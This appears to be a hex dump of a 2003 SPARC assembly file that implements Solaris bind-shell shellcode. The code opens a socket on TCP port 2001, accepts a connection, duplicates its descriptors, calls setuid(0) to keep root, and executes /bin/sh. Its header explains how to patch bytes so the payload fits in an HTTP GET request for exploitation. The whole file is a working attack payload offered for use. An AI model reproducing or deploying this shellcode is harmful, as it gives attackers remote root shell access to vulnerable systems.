00000000  21 21 21 20 24 49 64 3a  20 73 70 61 72 63 2d 62  |!!! $Id: sparc-b|
00000010  69 6e 64 2e 73 2c 76 20  31 2e 31 20 32 30 30 33  |ind.s,v 1.1 2003|
00000020  2f 30 33 2f 30 31 20 30  31 3a 31 30 3a 35 31 20  |/03/01 01:10:51 |
00000030  67 68 61 6e 64 69 20 45  78 70 20 24 0d 0a 21 21  |ghandi Exp $..!!|
00000040  21 20 42 69 6e 64 20 2f  62 69 6e 2f 73 68 20 74  |! Bind /bin/sh t|
00000050  6f 20 54 43 50 20 70 6f  72 74 20 32 30 30 31 2e  |o TCP port 2001.|
00000060  20 20 43 61 6c 6c 73 20  73 65 74 75 69 64 28 30  |  Calls setuid(0|
00000070  29 20 73 6f 20 2f 62 69  6e 2f 73 68 20 77 6f 6e  |) so /bin/sh won|
00000080  27 74 0d 0a 21 21 21 20  64 72 6f 70 20 70 72 69  |'t..!!! drop pri|
00000090  76 69 6c 65 67 65 73 2e  20 20 41 66 74 65 72 20  |vileges.  After |
000000a0  61 73 73 65 6d 62 6c 79  2c 20 63 68 61 6e 67 65  |assembly, change|
000000b0  20 74 68 65 20 74 68 69  72 64 20 62 79 74 65 20  | the third byte |
000000c0  69 6e 20 74 68 65 0d 0a  21 21 21 20 74 72 61 70  |in the..!!! trap|
000000d0  20 69 6e 73 74 72 75 63  74 69 6f 6e 73 20 74 6f  | instructions to|
000000e0  20 30 78 33 38 20 74 6f  20 61 76 6f 69 64 20 68  | 0x38 to avoid h|
000000f0  61 76 69 6e 67 20 73 70  61 63 65 73 20 69 6e 20  |aving spaces in |
00000100  74 68 65 20 69 6e 70 75  74 20 73 6f 20 74 68 61  |the input so tha|
00000110  74 0d 0a 21 21 21 20 69  74 20 6d 61 79 20 62 65  |t..!!! it may be|
00000120  20 75 73 65 64 20 69 6e  20 61 6e 20 48 54 54 50  | used in an HTTP|
00000130  20 47 45 54 20 72 65 71  75 65 73 74 2e 20 20 46  | GET request.  F|
00000140  6f 72 20 53 6f 6c 61 72  69 73 2f 53 50 41 52 43  |or Solaris/SPARC|
00000150  2e 0d 0a 21 21 21 20 0d  0a 21 21 21 20 22 49 27  |...!!! ..!!! "I'|
00000160  76 65 20 63 6f 6d 65 20  68 65 72 65 20 74 6f 20  |ve come here to |
00000170  63 68 65 77 20 62 75 62  62 6c 65 2d 67 75 6d 20  |chew bubble-gum |
00000180  61 6e 64 20 6b 69 63 6b  20 61 73 73 2e 2e 2e 41  |and kick ass...A|
00000190  6e 64 20 49 27 6d 20 61  6c 6c 20 6f 75 74 20 6f  |nd I'm all out o|
000001a0  66 0d 0a 21 21 21 20 62  75 62 62 6c 65 20 67 75  |f..!!! bubble gu|
000001b0  6d 2e 22 0d 0a 21 21 21  20 2d 2d 20 4e 61 64 61  |m."..!!! -- Nada|
000001c0  20 28 52 6f 64 64 79 20  50 69 70 65 72 29 2c 20  | (Roddy Piper), |
000001d0  22 54 68 65 79 20 4c 69  76 65 22 0d 0a 21 21 21  |"They Live"..!!!|
000001e0  20 0d 0a 21 21 21 20 2d  67 68 61 6e 64 69 20 3c  | ..!!! -ghandi <|
000001f0  20 67 68 61 6e 64 69 40  6d 69 6e 64 6c 65 73 73  | ghandi@mindless|
00000200  2e 63 6f 6d 20 3e 0d 0a  21 21 21 0d 0a 0d 0a 2e  |.com >..!!!.....|
00000210  67 6c 6f 62 61 6c 09 62  69 6e 64 73 68 0d 0a 2e  |global.bindsh...|
00000220  74 79 70 65 20 62 69 6e  64 73 68 2c 23 66 75 6e  |type bindsh,#fun|
00000230  63 74 69 6f 6e 0d 0a 0d  0a 62 69 6e 64 73 68 3a  |ction....bindsh:|
00000240  09 73 75 62 09 25 73 70  2c 20 31 36 2c 20 25 6c  |.sub.%sp, 16, %l|
00000250  30 09 09 21 20 73 74 72  75 63 74 20 73 6f 63 6b  |0..! struct sock|
00000260  61 64 64 72 20 73 61 3b  0d 0a 0d 0a 09 73 75 62  |addr sa;.....sub|
00000270  09 25 73 70 2c 20 25 6c  30 2c 20 25 6c 37 3b 0d  |.%sp, %l0, %l7;.|
00000280  0a 09 73 74 09 25 6c 37  2c 20 5b 25 73 70 20 2d  |..st.%l7, [%sp -|
00000290  20 32 30 5d 09 09 21 20  69 6e 74 20 73 61 5f 6c  | 20]..! int sa_l|
000002a0  65 6e 20 3d 20 31 36 3b  0d 0a 0d 0a 09 73 75 62  |en = 16;.....sub|
000002b0  09 25 6c 37 2c 20 31 34  2c 20 25 6f 30 0d 0a 09  |.%l7, 14, %o0...|
000002c0  73 75 62 09 25 6c 37 2c  20 31 34 2c 20 25 6f 31  |sub.%l7, 14, %o1|
000002d0  0d 0a 09 78 6f 72 09 25  6c 31 2c 20 25 6c 31 2c  |...xor.%l1, %l1,|
000002e0  20 25 6f 32 0d 0a 09 78  6f 72 09 25 6c 31 2c 20  | %o2...xor.%l1, |
000002f0  25 6c 31 2c 20 25 6f 33  09 09 21 20 25 6f 33 20  |%l1, %o3..! %o3 |
00000300  77 69 6c 6c 20 62 65 20  75 73 65 64 20 61 73 20  |will be used as |
00000310  61 20 25 67 30 0d 0a 09  73 75 62 09 25 6c 37 2c  |a %g0...sub.%l7,|
00000320  20 31 35 2c 20 25 6f 34  0d 0a 09 61 64 64 09 25  | 15, %o4...add.%|
00000330  6c 37 2c 20 28 32 33 30  20 2d 20 31 36 29 2c 20  |l7, (230 - 16), |
00000340  25 67 31 0d 0a 09 74 61  09 38 0d 0a 09 78 6f 72  |%g1...ta.8...xor|
00000350  09 25 6f 32 2c 20 25 6f  30 2c 20 25 6c 32 09 09  |.%o2, %o0, %l2..|
00000360  21 20 73 20 3d 20 73 6f  63 6b 65 74 28 41 46 5f  |! s = socket(AF_|
00000370  49 4e 45 54 2c 20 53 4f  43 4b 5f 53 54 52 45 41  |INET, SOCK_STREA|
00000380  4d 2c 20 30 29 3b 0d 0a  0d 0a 09 73 74 68 09 25  |M, 0);.....sth.%|
00000390  6f 31 2c 20 5b 25 73 70  20 2d 20 31 36 5d 09 09  |o1, [%sp - 16]..|
000003a0  21 20 73 61 2e 73 69 6e  5f 66 61 6d 69 6c 79 20  |! sa.sin_family |
000003b0  3d 20 41 46 5f 49 4e 45  54 3b 0d 0a 09 6d 6f 76  |= AF_INET;...mov|
000003c0  09 32 30 30 31 2c 20 25  6c 36 0d 0a 09 73 74 68  |.2001, %l6...sth|
000003d0  09 25 6c 36 2c 20 5b 25  73 70 20 2d 20 31 34 5d  |.%l6, [%sp - 14]|
000003e0  09 09 21 20 73 61 2e 73  69 6e 5f 70 6f 72 74 20  |..! sa.sin_port |
000003f0  3d 20 32 30 30 31 3b 0d  0a 09 73 74 09 25 67 30  |= 2001;...st.%g0|
00000400  2c 20 5b 25 73 70 20 2d  20 31 32 5d 09 09 21 20  |, [%sp - 12]..! |
00000410  73 61 2e 73 69 6e 5f 61  64 64 72 2e 73 5f 61 64  |sa.sin_addr.s_ad|
00000420  64 72 20 3d 20 49 4e 41  44 44 52 5f 41 4e 59 3b  |dr = INADDR_ANY;|
00000430  0d 0a 0d 0a 09 78 6f 72  09 25 6f 33 2c 20 25 6c  |.....xor.%o3, %l|
00000440  32 2c 20 25 6f 30 0d 0a  09 78 6f 72 09 25 6f 33  |2, %o0...xor.%o3|
00000450  2c 20 25 6c 30 2c 20 25  6f 31 0d 0a 09 78 6f 72  |, %l0, %o1...xor|
00000460  09 25 6f 33 2c 20 25 6c  37 2c 20 25 6f 32 0d 0a  |.%o3, %l7, %o2..|
00000470  09 61 64 64 09 25 6c 37  2c 20 28 32 33 32 20 2d  |.add.%l7, (232 -|
00000480  20 31 36 29 2c 20 25 67  31 0d 0a 09 74 61 09 38  | 16), %g1...ta.8|
00000490  09 09 09 21 20 62 69 6e  64 28 73 2c 20 26 73 61  |...! bind(s, &sa|
000004a0  2c 20 73 61 5f 6c 65 6e  29 3b 0d 0a 0d 0a 09 78  |, sa_len);.....x|
000004b0  6f 72 09 25 6f 33 2c 20  25 6c 32 2c 20 25 6f 30  |or.%o3, %l2, %o0|
000004c0  0d 0a 09 73 75 62 09 25  6c 37 2c 20 28 31 36 20  |...sub.%l7, (16 |
000004d0  2d 20 35 29 2c 20 25 6f  31 0d 0a 09 61 64 64 09  |- 5), %o1...add.|
000004e0  25 6c 37 2c 20 28 32 33  33 20 2d 20 31 36 29 2c  |%l7, (233 - 16),|
000004f0  20 25 67 31 0d 0a 09 74  61 09 38 09 09 09 21 20  | %g1...ta.8...! |
00000500  6c 69 73 74 65 6e 28 73  2c 20 53 4f 4d 41 58 43  |listen(s, SOMAXC|
00000510  4f 4e 4e 29 3b 0d 0a 09  0d 0a 09 78 6f 72 09 25  |ONN);......xor.%|
00000520  6f 33 2c 20 25 6c 32 2c  20 25 6f 30 0d 0a 09 78  |o3, %l2, %o0...x|
00000530  6f 72 09 25 6f 33 2c 20  25 6c 30 2c 20 25 6f 31  |or.%o3, %l0, %o1|
00000540  0d 0a 09 73 75 62 09 25  73 70 2c 20 32 30 2c 20  |...sub.%sp, 20, |
00000550  25 6f 32 0d 0a 09 61 64  64 09 25 6c 37 2c 20 28  |%o2...add.%l7, (|
00000560  32 33 34 20 2d 20 31 36  29 2c 20 25 67 31 0d 0a  |234 - 16), %g1..|
00000570  09 74 61 09 38 09 09 0d  0a 09 78 6f 72 09 25 6f  |.ta.8.....xor.%o|
00000580  33 2c 20 25 6f 30 2c 20  25 6c 33 09 09 21 20 63  |3, %o0, %l3..! c|
00000590  20 3d 20 61 63 63 65 70  74 28 73 2c 20 26 73 61  | = accept(s, &sa|
000005a0  2c 20 26 73 61 5f 6c 65  6e 29 3b 0d 0a 0d 0a 09  |, &sa_len);.....|
000005b0  78 6f 72 09 25 6f 33 2c  20 25 6c 33 2c 20 25 6f  |xor.%o3, %l3, %o|
000005c0  30 0d 0a 09 73 75 62 09  25 6c 37 2c 20 28 31 36  |0...sub.%l7, (16|
000005d0  20 2d 20 39 29 2c 20 20  25 6f 31 0d 0a 09 78 6f  | - 9),  %o1...xo|
000005e0  72 09 25 73 70 2c 20 25  73 70 2c 20 25 6f 32 0d  |r.%sp, %sp, %o2.|
000005f0  0a 09 61 64 64 09 25 6c  37 2c 20 28 36 32 20 2d  |..add.%l7, (62 -|
00000600  20 31 36 29 2c 20 25 67  31 0d 0a 09 74 61 09 38  | 16), %g1...ta.8|
00000610  09 09 09 21 20 69 6f 63  74 6c 28 63 2c 20 49 5f  |...! ioctl(c, I_|
00000620  44 55 50 32 46 44 2c 20  30 29 3b 0d 0a 0d 0a 09  |DUP2FD, 0);.....|
00000630  78 6f 72 20 20 20 20 20  25 6f 33 2c 20 25 6c 33  |xor     %o3, %l3|
00000640  2c 20 25 6f 30 0d 0a 20  20 20 20 20 20 20 20 73  |, %o0..        s|
00000650  75 62 20 20 20 20 20 25  6c 37 2c 20 28 31 36 20  |ub     %l7, (16 |
00000660  2d 20 39 29 2c 20 20 25  6f 31 0d 0a 09 61 64 64  |- 9),  %o1...add|
00000670  09 25 6f 33 2c 20 31 2c  20 25 6f 32 0d 0a 09 61  |.%o3, 1, %o2...a|
00000680  64 64 09 25 6c 37 2c 20  28 36 32 20 2d 20 31 36  |dd.%l7, (62 - 16|
00000690  29 2c 20 25 67 31 0d 0a  09 74 61 09 38 09 09 09  |), %g1...ta.8...|
000006a0  21 20 69 6f 63 74 6c 28  63 2c 20 49 5f 44 55 50  |! ioctl(c, I_DUP|
000006b0  32 46 44 2c 20 31 29 3b  0d 0a 0d 0a 09 78 6f 72  |2FD, 1);.....xor|
000006c0  20 20 20 20 20 25 6f 33  2c 20 25 6c 33 2c 20 25  |     %o3, %l3, %|
000006d0  6f 30 0d 0a 20 20 20 20  20 20 20 20 73 75 62 20  |o0..        sub |
000006e0  20 20 20 20 25 6c 37 2c  20 28 31 36 20 2d 20 39  |    %l7, (16 - 9|
000006f0  29 2c 20 20 25 6f 31 0d  0a 09 61 64 64 09 25 6f  |),  %o1...add.%o|
00000700  33 2c 20 32 2c 20 25 6f  32 0d 0a 09 61 64 64 09  |3, 2, %o2...add.|
00000710  25 6c 37 2c 20 28 36 32  20 2d 20 31 36 29 2c 20  |%l7, (62 - 16), |
00000720  25 67 31 0d 0a 09 74 61  09 38 09 09 09 21 20 69  |%g1...ta.8...! i|
00000730  6f 63 74 6c 28 63 2c 20  49 5f 44 55 50 32 46 44  |octl(c, I_DUP2FD|
00000740  2c 20 32 29 3b 0d 0a 09  0d 0a 09 78 6f 72 09 25  |, 2);......xor.%|
00000750  73 70 2c 20 25 73 70 2c  20 25 6f 30 09 09 21 20  |sp, %sp, %o0..! |
00000760  25 6f 30 20 3d 20 30 3b  0d 0a 09 61 64 64 09 25  |%o0 = 0;...add.%|
00000770  6f 33 2c 20 32 33 2c 20  25 67 31 0d 0a 09 74 61  |o3, 23, %g1...ta|
00000780  09 38 09 09 09 21 20 73  65 74 75 69 64 28 30 29  |.8...! setuid(0)|
00000790  3b 0d 0a 09 73 65 74 09  30 78 32 66 36 32 36 39  |;...set.0x2f6269|
000007a0  36 65 2c 20 25 6c 30 09  09 21 20 28 76 6f 69 64  |6e, %l0..! (void|
000007b0  2a 29 73 68 20 3d 20 27  2f 62 69 6e 27 3b 0d 0a  |*)sh = '/bin';..|
000007c0  09 73 65 74 09 30 78 32  66 37 33 36 38 30 30 2c  |.set.0x2f736800,|
000007d0  20 25 6c 31 09 09 21 20  28 76 6f 69 64 2a 29 73  | %l1..! (void*)s|
000007e0  68 20 2b 20 34 20 3d 20  27 2f 73 68 30 27 3b 0d  |h + 4 = '/sh0';.|
000007f0  0a 09 73 75 62 09 25 73  70 2c 20 31 36 2c 20 25  |..sub.%sp, 16, %|
00000800  6f 30 09 09 21 20 25 6f  30 20 3d 20 27 2f 62 69  |o0..! %o0 = '/bi|
00000810  6e 2f 73 68 27 3b 0d 0a  09 73 75 62 09 25 73 70  |n/sh';...sub.%sp|
00000820  2c 20 38 2c 20 25 6f 31  09 09 21 20 25 6f 31 20  |, 8, %o1..! %o1 |
00000830  3d 20 7b 27 2f 62 69 6e  2f 73 68 27 2c 20 4e 55  |= {'/bin/sh', NU|
00000840  4c 4c 7d 3b 0d 0a 09 78  6f 72 09 25 73 70 2c 20  |LL};...xor.%sp, |
00000850  25 73 70 2c 20 25 6f 32  09 09 21 20 25 6f 32 20  |%sp, %o2..! %o2 |
00000860  3d 20 4e 55 4c 4c 3b 0d  0a 09 73 74 64 09 25 6c  |= NULL;...std.%l|
00000870  30 2c 20 5b 25 73 70 20  2d 20 31 36 5d 0d 0a 09  |0, [%sp - 16]...|
00000880  73 74 09 25 6f 30 2c 20  5b 25 73 70 20 2d 20 38  |st.%o0, [%sp - 8|
00000890  5d 09 09 21 20 61 72 67  76 5b 30 5d 20 3d 20 73  |]..! argv[0] = s|
000008a0  68 3b 0d 0a 09 73 74 09  25 67 30 2c 20 5b 25 73  |h;...st.%g0, [%s|
000008b0  70 20 2d 20 34 5d 09 09  21 20 61 72 67 76 5b 31  |p - 4]..! argv[1|
000008c0  5d 20 3d 20 4e 55 4c 4c  3b 0d 0a 09 61 64 64 09  |] = NULL;...add.|
000008d0  25 6f 33 2c 20 35 39 2c  20 25 67 31 0d 0a 09 74  |%o3, 59, %g1...t|
000008e0  61 09 38 09 09 09 21 20  65 78 65 63 76 65 28 73  |a.8...! execve(s|
000008f0  68 2c 20 61 72 67 76 2c  20 4e 55 4c 4c 29 3b 0d  |h, argv, NULL);.|
00000900  0a 09 78 6f 72 09 25 73  70 2c 20 25 73 70 2c 20  |..xor.%sp, %sp, |
00000910  25 6f 30 09 09 21 20 25  6f 30 20 3d 20 30 3b 0d  |%o0..! %o0 = 0;.|
00000920  0a 09 61 64 64 09 25 6f  33 2c 20 31 36 30 2c 20  |..add.%o3, 160, |
00000930  25 67 31 09 09 21 20 25  67 31 20 3d 20 31 36 30  |%g1..! %g1 = 160|
00000940  3b 0d 0a 09 74 61 09 38  09 09 09 21 20 6c 77 70  |;...ta.8...! lwp|
00000950  5f 65 78 69 74 28 30 29                           |_exit(0)|
00000958
